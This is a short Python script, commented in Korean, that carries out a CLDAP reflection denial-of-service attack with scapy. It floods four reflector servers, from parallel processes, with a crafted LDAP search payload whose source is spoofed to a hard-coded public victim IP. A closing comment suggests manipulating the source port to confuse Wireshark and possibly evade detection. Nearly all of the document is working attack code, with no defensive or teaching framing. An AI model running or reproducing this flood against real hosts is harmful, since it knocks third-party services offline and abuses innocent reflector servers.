from scapy.all import *
from multiprocessing import Process

CLDAP_PORT = 389

payload = bytes(
    [0x30, 0x84, 0x00, 0x00, 0x00, 0x2d, 0x02, 0x01, 0x07, 0x63, 0x84, 0x00, 0x00, 0x00, 0x24, 0x04, 0x00, 0x0a,
     0x01, 0x00, 0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x64, 0x01, 0x01, 0x00, 0x87, 0x0b, 0x6f, 0x62,
     0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x84, 0x00, 0x00, 0x00, 0x00])
    # CLDAP 질의 바이트코드 => "LDAPMessage searchRequest(7) '<ROOT>' baseObject"

def DOS_RUN(ip_info):
    # ip_info => ( 192.168.0.201, 192.168.0.140 )
    target_ip = ip_info[0]     # 192.168.0.201
    reflector_ip = ip_info[1]  # 192.168.0.140

    Packet = sr1flood(IP(src=target_ip, dst=reflector_ip) / UDP(sport=389,dport=CLDAP_PORT) / payload)
    # scapy 모듈 활용 -> 패킷 내용 설정하는 부분

    send(Packet) #패킷 전송

if __name__ == "__main__":

    target_ip = "183.99.246.120"  # 피해 대상 IP
    reflector_ip_list = ["192.168.0.140", "192.168.0.200", "192.168.0.193", "192.168.0.202"]
    # 반사 서버 IP 리스트

    ip_info_list = [(target_ip, ref_ip) for ref_ip in reflector_ip_list]
    # 피해대상 IP, 반사서버 IP를 재 조합하여 새로운 리스트 생성

    Process_List = list()

    for ip_data in ip_info_list:
        Dos_Process = Process(target=DOS_RUN,args=[ip_data]) # DOS 공격을 멀티프로세스로 진행
        Process_List.append(Dos_Process) # DOS 공격 프로세스 정보를 리스트에 저장
        Dos_Process.start() # 각 프로세스 DOS 공격 실행 명령

    for Dos_Proc in Process_List:
        Dos_Proc.join()

# UDP 부분의 Source Port를 조작하게 되면 와이어샤크 상에서 표시되는 프로토콜 이름 조작가능
# 탐지를 우회할 수도 ??